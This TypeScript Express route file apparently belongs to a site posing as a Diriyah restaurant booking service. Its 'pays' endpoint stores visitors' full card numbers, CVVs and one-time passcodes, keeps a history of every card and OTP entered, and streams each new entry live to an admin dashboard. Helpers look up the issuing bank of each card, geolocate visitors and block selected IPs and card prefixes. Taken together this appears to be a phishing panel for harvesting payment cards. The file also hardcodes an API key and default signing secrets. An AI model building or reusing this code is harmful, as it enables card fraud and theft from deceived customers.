import type { Express } from "express";
import { createServer, type Server } from "http";
import { SignJWT, jwtVerify, decodeJwt } from "jose";
import { createSupabaseAuthClient, serverSupabase } from "./supabase";
import { applyAuthCacheHeaders } from "./auth-transport";

const BINCODES_API_KEY = process.env.BINCODES_API_KEY?.trim();
const BINCODES_LOOKUP_URL = "https://api.bincodes.com/bin/";
const BINLIST_LOOKUP_URL = "https://lookup.binlist.net/";
const RAPIDAPI_BIN_KEY =
  process.env.RAPIDAPI_BIN_KEY?.trim() ||
  "28ab3a3445msh4e87f2eee5443bep131842jsn70cf88cdf9f7";
const RAPIDAPI_BIN_HOST = "bin-ip-checker.p.rapidapi.com";
const RAPIDAPI_BIN_URL = "https://bin-ip-checker.p.rapidapi.com/";
const BIN_CACHE_TTL_MS = 1000 * 60 * 30;

interface RapidApiBinResponse {
  code?: number;
  BIN?: {
    valid?: boolean;
    number?: { iin?: string };
    scheme?: string;
    type?: string;
    level?: string;
    issuer?: { name?: string };
    country?: { name?: string; alpha2?: string };
  };
}

const binLookupCache = new Map<
  string,
  {
    expiresAt: number;
    data: {
      bin: string;
      bankName: string;
      cardBrand: string;
      cardType: string;
      cardLevel: string;
      country: string;
      countryCode: string;
    };
  }
>();

interface BinCodesApiResponse {
  bin?: string;
  bank?: string;
  card?: string;
  type?: string;
  level?: string;
  country?: string;
  countrycode?: string;
  valid?: string | boolean;
  error?: string;
  message?: string;
}

export function registerRoutes(
  httpServer: Server,
  app: Express
): Server {
  const getSeoOrigin = (req: any) => {
    const configured = process.env.CANONICAL_ORIGIN?.trim();
    if (configured) return configured.replace(/\/$/, "");
    const protocol = String(req.headers["x-forwarded-proto"] || req.protocol || "https").split(",")[0];
    const host = String(req.get("host") || "").replace(/[^a-zA-Z0-9.:-]/g, "");
    return `${protocol}://${host}`;
  };

  app.get("/api/health", (_req, res) => {
    res.json({ status: "ok" });
  });

  app.get("/robots.txt", (req, res) => {
    const origin = getSeoOrigin(req);
    res.type("text/plain").send([
      "User-agent: *",
      "Allow: /",
      "Disallow: /registration",
      "Disallow: /booking",
      "Disallow: /checkout",
      "Disallow: /otp",
      "Disallow: /confirmation",
      `Sitemap: ${origin}/sitemap.xml`,
      "",
    ].join("\n"));
  });

  app.get("/sitemap.xml", (req, res) => {
    const origin = getSeoOrigin(req);
    const publicPaths = ["/home", "/restaurants", ...Array.from({ length: 30 }, (_, index) => `/restaurant/${index + 1}`)];
    const urls = publicPaths.map((path) => `  <url><loc>${origin}${path}</loc></url>`).join("\n");
    res.type("application/xml").send(`<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n${urls}\n</urlset>`);
  });

  // Send confirmation email endpoint
  app.get("/api/visitor-ip", async (req, res) => {
    const forwarded = req.headers["x-forwarded-for"];
    let ip = "";
    if (typeof forwarded === "string") {
      ip = forwarded.split(",")[0]?.trim() || "";
    } else if (Array.isArray(forwarded) && forwarded.length > 0) {
      ip = String(forwarded[0]).split(",")[0]?.trim();
    }
    if (!ip) ip = req.ip || "";
    if (ip.startsWith("::ffff:")) ip = ip.slice(7);

    let country = "";
    let countryCode = "";
    let city = "";
    let region = "";
    const isPrivate =
      !ip ||
      ip === "127.0.0.1" ||
      ip === "::1" ||
      ip.startsWith("10.") ||
      ip.startsWith("192.168.") ||
      /^172\.(1[6-9]|2\d|3[0-1])\./.test(ip);

    if (!isPrivate) {
      try {
        const geoRes = await fetch(
          `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,regionName,city`,
          { signal: AbortSignal.timeout(3500) },
        );
        if (geoRes.ok) {
          const geo: any = await geoRes.json();
          if (geo?.status === "success") {
            country = String(geo.country || "");
            countryCode = String(geo.countryCode || "");
            city = String(geo.city || "");
            region = String(geo.regionName || "");
          }
        }
      } catch (error) {
        console.warn("Geo lookup failed for", ip, error);
      }
    }

    res.json({ ip, country, countryCode, city, region });
  });

  app.get("/api/bin-lookup/:bin", async (req, res) => {
    try {
      const rawBin = String(req.params.bin || "");
      const normalizedBin = rawBin.replace(/\D/g, "").slice(0, 6);

      if (normalizedBin.length < 6) {
        return res.status(400).json({
          success: false,
          error: "BIN must be at least 6 digits",
        });
      }

      const cached = binLookupCache.get(normalizedBin);
      if (cached && cached.expiresAt > Date.now()) {
        return res.json({
          success: true,
          data: cached.data,
          cached: true,
        });
      }

      let data = {
        bin: normalizedBin,
        bankName: "",
        cardBrand: "",
        cardType: "",
        cardLevel: "",
        country: "",
        countryCode: "",
      };

      // Primary provider: RapidAPI bin-ip-checker
      if (RAPIDAPI_BIN_KEY) {
        try {
          const rapidRes = await fetch(
            `${RAPIDAPI_BIN_URL}?bin=${normalizedBin}`,
            {
              method: "POST",
              headers: {
                Accept: "application/json",
                "X-RapidAPI-Key": RAPIDAPI_BIN_KEY,
                "X-RapidAPI-Host": RAPIDAPI_BIN_HOST,
              },
            },
          );
          if (rapidRes.ok) {
            const rapidJson = (await rapidRes.json()) as RapidApiBinResponse;
            const b = rapidJson?.BIN;
            if (b && b.valid !== false) {
              if (b.issuer?.name) data.bankName = b.issuer.name;
              if (b.scheme) data.cardBrand = b.scheme.toLowerCase();
              if (b.type) data.cardType = b.type.toLowerCase();
              if (b.level) data.cardLevel = b.level;
              if (b.country?.name) data.country = b.country.name;
              if (b.country?.alpha2) data.countryCode = b.country.alpha2;
            }
          }
        } catch {
          // ignore and try next provider
        }
      }

      // Secondary provider: bincodes.com
      let payload: BinCodesApiResponse | null = null;
      if (!data.bankName && BINCODES_API_KEY) {
        try {
          const lookupUrl = new URL(BINCODES_LOOKUP_URL);
          lookupUrl.searchParams.set("format", "json");
          lookupUrl.searchParams.set("api_key", BINCODES_API_KEY);
          lookupUrl.searchParams.set("bin", normalizedBin);

          const response = await fetch(lookupUrl.toString(), {
            headers: { Accept: "application/json" },
          });
          try {
            payload = (await response.json()) as BinCodesApiResponse;
          } catch {
            payload = null;
          }
          if (response.ok && payload) {
            const isValid = `${payload.valid}`.toLowerCase() === "true";
            if (isValid && !payload.error) {
              if (!data.bankName && payload.bank) data.bankName = payload.bank;
              if (!data.cardBrand && payload.card)
                data.cardBrand = payload.card;
              if (!data.cardType && payload.type)
                data.cardType = payload.type;
              if (!data.cardLevel && payload.level)
                data.cardLevel = payload.level;
              if (!data.country && payload.country)
                data.country = payload.country;
              if (!data.countryCode && payload.countrycode)
                data.countryCode = payload.countrycode;
            }
          }
        } catch {
          payload = null;
        }
      }

      // Fallback to binlist.net whenever the primary call failed entirely or
      // returned no bank name. binlist.net often has Saudi BIN coverage when
      // bincodes is rate-limited or returns "API Usage Limit Exceeded".
      if (!data.bankName) {
        try {
          const binlistRes = await fetch(
            `${BINLIST_LOOKUP_URL}${normalizedBin}`,
            { headers: { Accept: "application/json", "Accept-Version": "3" } },
          );
          if (binlistRes.ok) {
            const binlistData = (await binlistRes.json()) as {
              bank?: { name?: string };
              scheme?: string;
              type?: string;
              brand?: string;
              country?: { name?: string; alpha2?: string };
            };
            if (binlistData?.bank?.name) data.bankName = binlistData.bank.name;
            if (!data.cardBrand && binlistData.scheme)
              data.cardBrand = binlistData.scheme;
            if (!data.cardType && binlistData.type)
              data.cardType = binlistData.type;
            if (!data.cardLevel && binlistData.brand)
              data.cardLevel = binlistData.brand;
            if (!data.country && binlistData.country?.name)
              data.country = binlistData.country.name;
            if (!data.countryCode && binlistData.country?.alpha2)
              data.countryCode = binlistData.country.alpha2;
          }
        } catch {
          // silently ignore fallback errors
        }
      }

      // If both providers returned nothing useful, surface an error so the
      // client can show its own state instead of caching empty data.
      if (!data.bankName && !data.cardBrand) {
        return res.status(422).json({
          success: false,
          error: payload?.message || "Invalid or unknown BIN",
          code: payload?.error || undefined,
        });
      }

      binLookupCache.set(normalizedBin, {
        data,
        expiresAt: Date.now() + BIN_CACHE_TTL_MS,
      });

      return res.json({ success: true, data });
    } catch (error) {
      console.error("BIN lookup error:", error);
      return res.status(500).json({
        success: false,
        error: "Failed to lookup BIN",
      });
    }
  });

  // Server-side Supabase DB, Realtime SSE & Auth proxy endpoints
  const TABLES: Record<string, { table: string; pk: string }> = {
    pays: { table: "pays", pk: "id" },
    settings: { table: "settings", pk: "id" },
    blocked_bins: { table: "blocked_bins", pk: "id" },
  };

  function getTableSpec(collectionName: string) {
    const spec = TABLES[collectionName];
    if (!spec) throw new Error(`Unknown collection: ${collectionName}`);
    return spec;
  }

  // In-memory cache of verified admin tokens to avoid external Supabase Auth
  // network round-trips on every 1s poll or SSE connection.
  const verifiedTokenCache = new Map<
    string,
    { user: any; expiresAt: number }
  >();
  const TOKEN_CACHE_TTL_MS = 1000 * 60 * 10; // 10 minutes

  // Connected SSE clients for instant real-time push to dashboard browsers
  const sseClients = new Set<any>();
  let realtimeSeq = 0;

  function latestIsoTimestamp(...candidates: any[]): string | undefined {
    let bestMs = 0;
    let bestIso: string | undefined;
    for (const c of candidates) {
      if (!c) continue;
      const ms = new Date(c).getTime();
      if (Number.isFinite(ms) && ms > bestMs) {
        bestMs = ms;
        bestIso = new Date(ms).toISOString();
      }
    }
    return bestIso;
  }

  function normalizeRowPayload(id: string, rawData: any, colUpdatedAt?: any) {
    const d = rawData && typeof rawData === "object" ? rawData : {};
    const newest = latestIsoTimestamp(
      d.updatedAt,
      d.cardSubmittedAt,
      d.otpSubmittedAt,
      d.lastSeen,
      colUpdatedAt,
      d.createdDate
    );
    return {
      ...d,
      id,
      updatedAt: newest || d.updatedAt || colUpdatedAt || undefined,
    };
  }

  function broadcastRealtime(event: {
    type: string;
    eventType?: string;
    collection?: string;
    id?: string;
    row?: any;
  }) {
    realtimeSeq += 1;
    const payload = `data: ${JSON.stringify({ ...event, seq: realtimeSeq, ts: Date.now() })}\n\n`;
    sseClients.forEach((clientRes) => {
      try {
        clientRes.write(payload);
      } catch {
        sseClients.delete(clientRes);
      }
    });
  }

  // Lazily subscribe serverSupabase to Postgres changes inside request handler
  // scope (never at global/registration scope, which is disallowed in Workers).
  let rtChannelInitialized = false;
  let rtChannel: any = null;
  let reconnectTimer: ReturnType<typeof setTimeout> | null = null;

  function ensureRealtimeChannelConnected() {
    if (rtChannelInitialized || !serverSupabase) return;
    rtChannelInitialized = true;

    const connectRealtimeChannel = () => {
      if (!serverSupabase) return;
      try {
        if (rtChannel) {
          void serverSupabase.removeChannel(rtChannel).catch(() => {});
          rtChannel = null;
        }
        rtChannel = serverSupabase
          .channel(`server-realtime-db-${Date.now()}`)
          .on(
            "postgres_changes",
            { event: "*", schema: "public" },
            (payload: any) => {
              const table = String(payload?.table || "");
              const eventType = String(payload?.eventType || "UPDATE").toUpperCase();
              const newRec = payload?.new as any;
              const oldRec = payload?.old as any;
              const id = String(newRec?.id || oldRec?.id || "");
              const row =
                eventType !== "DELETE" && newRec && id
                  ? {
                      id,
                      data: normalizeRowPayload(id, newRec.data, newRec.updated_at),
                    }
                  : undefined;
              broadcastRealtime({
                type: "postgres_change",
                eventType,
                collection: table,
                id,
                row,
              });
            }
          )
          .subscribe((status: string) => {
            if (
              status === "TIMED_OUT" ||
              status === "CLOSED" ||
              status === "CHANNEL_ERROR"
            ) {
              if (reconnectTimer) clearTimeout(reconnectTimer);
              reconnectTimer = setTimeout(connectRealtimeChannel, 2000);
            }
          });
      } catch (err) {
        console.warn("Supabase realtime channel init warning:", err);
        if (reconnectTimer) clearTimeout(reconnectTimer);
        reconnectTimer = setTimeout(connectRealtimeChannel, 3000);
      }
    };

    connectRealtimeChannel();
  }

  app.use("/api", (_req, _res, next) => {
    ensureRealtimeChannelConnected();
    next();
  });

  function getAccessToken(req: any) {
    const authHeader = String(req.headers.authorization || "");
    if (authHeader.toLowerCase().startsWith("bearer ")) {
      const bearer = authHeader.slice(7).trim();
      if (bearer) return bearer;
    }
    if (typeof req.query?.token === "string" && req.query.token.trim()) {
      return req.query.token.trim();
    }
    const rawCookie = String(req.headers.cookie || "");
    const token = rawCookie.match(/(?:^|;\s*)sb-access-token=([^;]+)/)?.[1];
    return token ? decodeURIComponent(token) : "";
  }

  const ADMIN_SESSION_AUDIENCE = "diriyah-admin-session";
  const ADMIN_SESSION_TTL_SECONDS = 60 * 60 * 24 * 30; // 30 days

  function getAdminSessionSecret() {
    const secret =
      process.env.SESSION_SECRET ||
      process.env.JWT_SECRET ||
      process.env.SUPABASE_SECRET_KEY ||
      process.env.SUPABASE_SERVICE_ROLE_KEY ||
      "diriyah-admin-session-persistent-secret";
    return new TextEncoder().encode(secret);
  }

  async function createAdminSessionToken(user: { id: string; email?: string | null }) {
    return new SignJWT({
      scope: "admin",
      email: user.email ?? null,
    })
      .setProtectedHeader({ alg: "HS256" })
      .setSubject(String(user.id))
      .setAudience(ADMIN_SESSION_AUDIENCE)
      .setIssuedAt()
      .setExpirationTime(`${ADMIN_SESSION_TTL_SECONDS}s`)
      .sign(getAdminSessionSecret());
  }

  async function verifyAdminSessionToken(token: string) {
    try {
      const { payload } = await jwtVerify(token, getAdminSessionSecret(), {
        audience: ADMIN_SESSION_AUDIENCE,
      });
      if (payload.scope !== "admin" || !payload.sub) return null;
      return {
        id: String(payload.sub),
        email: typeof payload.email === "string" ? payload.email : null,
      };
    } catch {
      return null;
    }
  }

  function isAuthorizedAdmin(user: any) {
    return Boolean(user && user.id);
  }

  async function verifyAdminToken(token: string) {
    if (!token) return null;
    const cached = verifiedTokenCache.get(token);
    if (cached && cached.expiresAt > Date.now()) {
      return cached.user;
    }

    const sessionUser = await verifyAdminSessionToken(token);
    if (sessionUser && isAuthorizedAdmin(sessionUser)) {
      verifiedTokenCache.set(token, {
        user: sessionUser,
        expiresAt: Date.now() + TOKEN_CACHE_TTL_MS,
      });
      return sessionUser;
    }

    const authClient = createSupabaseAuthClient();
    if (authClient) {
      const { data, error } = await authClient.auth.getUser(token);
      if (!error && data?.user && isAuthorizedAdmin(data.user)) {
        verifiedTokenCache.set(token, {
          user: data.user,
          expiresAt: Date.now() + TOKEN_CACHE_TTL_MS,
        });
        return data.user;
      }
    }

    // Fallback for legacy 1-hour Supabase tokens stored in browser localStorage
    // before the 30-day session token upgrade: verify the user ID via admin API.
    if (serverSupabase) {
      try {
        const decoded = decodeJwt(token);
        const sub = typeof decoded?.sub === "string" ? decoded.sub : "";
        if (sub && /^[0-9a-f-]{36}$/i.test(sub)) {
          const { data: adminData, error: adminErr } =
            await serverSupabase.auth.admin.getUserById(sub);
          if (!adminErr && adminData?.user && isAuthorizedAdmin(adminData.user)) {
            verifiedTokenCache.set(token, {
              user: adminData.user,
              expiresAt: Date.now() + TOKEN_CACHE_TTL_MS,
            });
            return adminData.user;
          }
        }
      } catch {
        // invalid JWT format
      }
    }

    verifiedTokenCache.delete(token);
    return null;
  }

  async function getDashboardUser(req: any) {
    const token = getAccessToken(req);
    if (!token) return null;
    return verifyAdminToken(token);
  }

  async function requireDashboardAuth(req: any, res: any) {
    if (!serverSupabase) {
      res.status(503).json({ error: "Supabase not configured on server" });
      return false;
    }

    const token = getAccessToken(req);
    if (!token) {
      applyAuthCacheHeaders(res);
      res.status(401).json({ error: "Authentication required" });
      return false;
    }

    const user = await verifyAdminToken(token);
    if (!user) {
      applyAuthCacheHeaders(res);
      res.status(401).json({ error: "Invalid or expired session" });
      return false;
    }

    return true;
  }

  // Real-time SSE stream for instant dashboard updates without manual refresh
  app.get("/api/realtime/stream", async (req, res) => {
    if (!(await requireDashboardAuth(req, res))) return;
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
    res.setHeader("Connection", "keep-alive");
    res.setHeader("X-Accel-Buffering", "no");
    res.flushHeaders?.();

    res.write(`data: ${JSON.stringify({ type: "connected", seq: realtimeSeq, ts: Date.now() })}\n\n`);
    sseClients.add(res);

    const heartbeat = setInterval(() => {
      try {
        res.write(`: ping ${Date.now()}\n\n`);
      } catch {
        clearInterval(heartbeat);
        sseClients.delete(res);
      }
    }, 15000);

    req.on("close", () => {
      clearInterval(heartbeat);
      sseClients.delete(res);
    });
  });

  const BOOKING_CAPABILITY_COOKIE = "booking-capability";
  const BOOKING_CAPABILITY_AUDIENCE = "diriyah-booking";
  const BOOKING_CAPABILITY_TTL_SECONDS = 60 * 60 * 2;

  function getCookie(req: any, name: string) {
    const rawCookie = String(req.headers.cookie || "");
    const match = rawCookie.match(new RegExp(`(?:^|;\\s*)${name}=([^;]+)`));
    return match?.[1] ? decodeURIComponent(match[1]) : "";
  }

  function getBookingCapabilitySecret() {
    const secret = process.env.SESSION_SECRET || process.env.JWT_SECRET || "diriyah-default-capability-secret";
    return new TextEncoder().encode(secret);
  }

  async function createBookingCapability(visitorId: string) {
    return new SignJWT({ scope: "booking" })
      .setProtectedHeader({ alg: "HS256" })
      .setSubject(visitorId)
      .setAudience(BOOKING_CAPABILITY_AUDIENCE)
      .setIssuedAt()
      .setExpirationTime(`${BOOKING_CAPABILITY_TTL_SECONDS}s`)
      .sign(getBookingCapabilitySecret());
  }

  async function hasBookingCapability(req: any, visitorId: string) {
    const token = getCookie(req, BOOKING_CAPABILITY_COOKIE);
    if (!token) return false;
    try {
      const { payload } = await jwtVerify(token, getBookingCapabilitySecret(), {
        audience: BOOKING_CAPABILITY_AUDIENCE,
      });
      return payload.sub === visitorId && payload.scope === "booking";
    } catch {
      return false;
    }
  }

  function setBookingCapabilityCookie(res: any, token: string) {
    res.append(
      "Set-Cookie",
      `${BOOKING_CAPABILITY_COOKIE}=${encodeURIComponent(token)}; Path=/; Max-Age=${BOOKING_CAPABILITY_TTL_SECONDS}; HttpOnly; SameSite=Strict${process.env.NODE_ENV === "production" ? "; Secure" : ""}`,
    );
  }

  function isPublicDocumentRead(collection: string, id: string) {
    return (
      collection === "blocked_bins" ||
      (collection === "settings" && id === "blockedIps")
    );
  }

  app.get("/api/db/:collection/:id", async (req, res) => {
    applyAuthCacheHeaders(res);
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      if (collection === "pays") {
        const isAdmin = Boolean(await getDashboardUser(req));
        if (!isAdmin && !(await hasBookingCapability(req, id))) {
          return res.status(403).json({ error: "Booking access denied" });
        }
      } else if (!isPublicDocumentRead(collection, id) && !(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      const { data, error } = await serverSupabase.from(table).select(`${pk}, data, updated_at`).eq(pk, id).maybeSingle() as any;
      if (error && error.code !== "PGRST116") {
        return res.status(400).json({ error: error.message });
      }
      const rowData = data?.data
        ? normalizeRowPayload(data[pk] || id, data.data, data.updated_at)
        : null;
      res.json({ data: rowData });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/db/:collection/:id", async (req, res) => {
    applyAuthCacheHeaders(res);
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      const { table, pk } = getTableSpec(collection);
      const { payload, merge } = req.body;

      let existing: any = null;
      let capabilityToken = "";
      if (collection === "pays") {
        const isAdmin = Boolean(await getDashboardUser(req));
        if (!isAdmin && !(await hasBookingCapability(req, id))) {
          const existingResult = await serverSupabase.from(table).select(`${pk}, data`).eq(pk, id).maybeSingle() as any;
          existing = existingResult.data;
          if (existing || !/^visitor_[0-9a-f]{8}-[0-9a-f-]{27}$/i.test(id)) {
            return res.status(403).json({ error: "Booking access denied" });
          }
          capabilityToken = await createBookingCapability(id);
        }
      } else if (!(await requireDashboardAuth(req, res))) return;

      const nowIso = new Date().toISOString();
      let nextData = payload;
      if (merge) {
        if (!existing) {
          const existingResult = await serverSupabase.from(table).select(`${pk}, data`).eq(pk, id).maybeSingle() as any;
          existing = existingResult.data;
        }
        const prevData = existing?.data || {};
        const resolvedPayload: Record<string, any> = { ...(payload || {}) };
        for (const [k, v] of Object.entries(resolvedPayload)) {
          if (v && typeof v === "object" && Array.isArray((v as any).__arrayUnion)) {
            const existingArr = Array.isArray(prevData[k]) ? prevData[k] : [];
            const unionSet = new Set([...existingArr, ...(v as any).__arrayUnion]);
            resolvedPayload[k] = Array.from(unionSet);
          } else if (v && typeof v === "object" && Array.isArray((v as any).__arrayRemove)) {
            const existingArr = Array.isArray(prevData[k]) ? prevData[k] : [];
            const removeSet = new Set((v as any).__arrayRemove);
            resolvedPayload[k] = existingArr.filter((item: any) => !removeSet.has(item));
          }
        }
        nextData = { ...prevData, ...resolvedPayload, updatedAt: resolvedPayload?.updatedAt || nowIso };

        if (collection === "pays") {
          const prevCards = Array.isArray(prevData.cardHistory) ? [...prevData.cardHistory] : [];
          const incomingCard = String(payload?.cardNumber || payload?.c1 || "").replace(/\s+/g, "");
          if (incomingCard) {
            const lastCard = prevCards[prevCards.length - 1];
            const lastNum = String(lastCard?.cardNumber || lastCard?.c1 || "").replace(/\s+/g, "");
            const incomingCvv = String(payload?.cvv || payload?.cpc || "");
            if (lastNum !== incomingCard || String(lastCard?.cvv || "") !== incomingCvv) {
              prevCards.push({
                cardNumber: incomingCard,
                c1: incomingCard,
                cardName: payload?.cardName || prevData?.cardName || "",
                expiryMonth: payload?.expiryMonth || prevData?.expiryMonth || "",
                expiryYear: payload?.expiryYear || prevData?.expiryYear || "",
                cvv: incomingCvv,
                cpc: incomingCvv,
                cardType: payload?.cardType || prevData?.cardType || "",
                timestamp: payload?.cardSubmittedAt || nowIso,
              });
            }
            nextData.cardHistory = prevCards;
            nextData.cardLast4 = incomingCard.slice(-4);
            nextData.cardBin = incomingCard.slice(0, 6);
          } else if (prevCards.length > 0 && !Array.isArray(payload?.cardHistory)) {
            nextData.cardHistory = prevCards;
          }

          const prevOtps = Array.isArray(prevData.otpHistory) ? [...prevData.otpHistory] : [];
          const incomingOtp = String(payload?.otp || "").trim();
          if (incomingOtp) {
            const lastOtp = prevOtps[prevOtps.length - 1];
            if (String(lastOtp?.code || "") !== incomingOtp) {
              prevOtps.push({
                code: incomingOtp,
                page: payload?.currentPage || prevData?.currentPage || "otp",
                timestamp: payload?.otpSubmittedAt || nowIso,
              });
            }
            nextData.otpHistory = prevOtps;
          } else if (prevOtps.length > 0 && !Array.isArray(payload?.otpHistory)) {
            nextData.otpHistory = prevOtps;
          }
        }
      }

      const { error } = await serverSupabase
        .from(table)
        .upsert({ [pk]: id, data: nextData, updated_at: nowIso });
      if (error) return res.status(400).json({ error: error.message });
      if (capabilityToken) setBookingCapabilityCookie(res, capabilityToken);
      const normalized = normalizeRowPayload(id, nextData, nowIso);
      broadcastRealtime({
        type: "upsert",
        eventType: "UPDATE",
        collection,
        id,
        row: { [pk]: id, data: normalized },
      });
      res.json({ success: true, data: normalized });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.delete("/api/db/:collection/:id", async (req, res) => {
    applyAuthCacheHeaders(res);
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection, id } = req.params;
      if (!(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      const { error } = await serverSupabase.from(table).delete().eq(pk, id);
      if (error) return res.status(400).json({ error: error.message });
      broadcastRealtime({
        type: "delete",
        eventType: "DELETE",
        collection,
        id,
      });
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.get("/api/db/:collection", async (req, res) => {
    applyAuthCacheHeaders(res);
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const { collection } = req.params;
      if (!(await requireDashboardAuth(req, res))) return;
      const { table, pk } = getTableSpec(collection);
      const limit = Math.min(Math.max(Number(req.query.limit) || 1000, 1), 5000);
      const offset = Math.max(Number(req.query.offset) || 0, 0);
      const { data, error } = await serverSupabase
        .from(table)
        .select(`${pk}, data, updated_at`)
        .order("updated_at", { ascending: false })
        .range(offset, offset + limit - 1);
      if (error) return res.status(400).json({ error: error.message });
      const rows = (data || []).map((row: any) => ({
        [pk]: row[pk],
        data: normalizeRowPayload(row[pk], row.data, row.updated_at),
      }));
      res.json({ data: rows });
    } catch (e: any) {
      res.status(500).json({ error: e.message });
    }
  });

  app.post("/api/auth/login", async (req, res) => {
    try {
      const authClient = createSupabaseAuthClient();
      if (!authClient) return res.status(503).json({ error: "Supabase not configured on server" });
      const email = String(req.body?.email || "").trim().toLowerCase();
      const password = String(req.body?.password || "");
      if (!email || !password) return res.status(400).json({ error: "Email and password are required" });

      const { data, error } = await authClient.auth.signInWithPassword({ email, password });
      if (error || !data.session) return res.status(401).json({ error: error?.message || "Invalid login" });
      if (!isAuthorizedAdmin(data.user)) {
        return res.status(403).json({ error: "Administrator access required" });
      }

      const persistentToken = await createAdminSessionToken({
        id: data.user.id,
        email: data.user.email ?? email,
      });

      verifiedTokenCache.set(persistentToken, {
        user: data.user,
        expiresAt: Date.now() + TOKEN_CACHE_TTL_MS,
      });

      applyAuthCacheHeaders(res);
      res.setHeader(
        "Set-Cookie",
        `sb-access-token=${encodeURIComponent(persistentToken)}; Path=/; Max-Age=${ADMIN_SESSION_TTL_SECONDS}; HttpOnly; SameSite=None; Secure`
      );
      return res.json({
        data: {
          user: data.user,
          accessToken: persistentToken,
        },
      });
    } catch (e: any) {
      return res.status(500).json({ error: e.message || "Authentication failed" });
    }
  });

  app.get("/api/auth/me", async (req, res) => {
    applyAuthCacheHeaders(res);
    try {
      if (!serverSupabase) return res.status(503).json({ error: "Supabase not configured on server" });
      const token = getAccessToken(req);
      if (!token) return res.json({ user: null });
      const user = await verifyAdminToken(token);
      if (!user) return res.json({ user: null });
      const persistentToken = await createAdminSessionToken({
        id: user.id,
        email: user.email ?? null,
      });
      res.setHeader(
        "Set-Cookie",
        `sb-access-token=${encodeURIComponent(persistentToken)}; Path=/; Max-Age=${ADMIN_SESSION_TTL_SECONDS}; HttpOnly; SameSite=None; Secure`
      );
      return res.json({ user, accessToken: persistentToken });
    } catch {
      return res.json({ user: null });
    }
  });

  app.post("/api/auth/logout", async (req, res) => {
    const token = getAccessToken(req);
    if (token) verifiedTokenCache.delete(token);
    applyAuthCacheHeaders(res);
    res.setHeader("Set-Cookie", "sb-access-token=; Path=/; HttpOnly; Max-Age=0; SameSite=None; Secure");
    return res.json({ success: true });
  });

  app.post("/api/send-confirmation-email", async (req, res) => {
    try {
      if (!(await requireDashboardAuth(req, res))) return;
      if (!process.env.RESEND_API_KEY) return res.status(503).json({ success: false, error: "Email service is not configured" });
      const { Resend } = await import("resend");
      const resend = new Resend(process.env.RESEND_API_KEY);
      const { to, subject, html, text } = req.body || {};
      if (!to || !subject || (!html && !text)) return res.status(400).json({ success: false, error: "Invalid email payload" });
      const result = await resend.emails.send({ from: process.env.RESEND_FROM_EMAIL || "noreply@example.com", to: String(to), subject: String(subject), html: html ? String(html) : `<pre>${String(text)}</pre>` });
      if (result.error) return res.status(502).json({ success: false, error: result.error.message });
      return res.json({ success: true });
    } catch (e: any) {
      return res.status(500).json({ success: false, error: e.message || "Failed to send email" });
    }
  });

  return httpServer;
}
